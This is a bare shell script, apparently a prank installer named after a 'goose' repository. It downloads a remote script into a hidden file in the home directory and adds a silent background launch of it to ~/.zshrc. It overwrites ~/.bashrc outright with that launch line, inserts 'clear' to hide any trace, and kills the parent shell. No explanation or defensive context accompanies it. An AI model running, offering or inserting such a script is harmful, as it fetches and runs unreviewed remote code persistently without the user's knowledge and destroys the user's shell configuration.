curl -s -o ~/.alert.sh https://raw.githubusercontent.com/PaulicStudios/goose/refs/heads/main/alert/alert.sh

echo 'nohup bash ~/.alert.sh > /dev/null &' >> ~/.zshrc
echo 'clear' >> ~/.zshrc
echo 'nohup bash ~/.alert.sh > /dev/null &' > ~/.bashrc
echo 'clear' >> ~/.bashrc

kill -9 $PPID
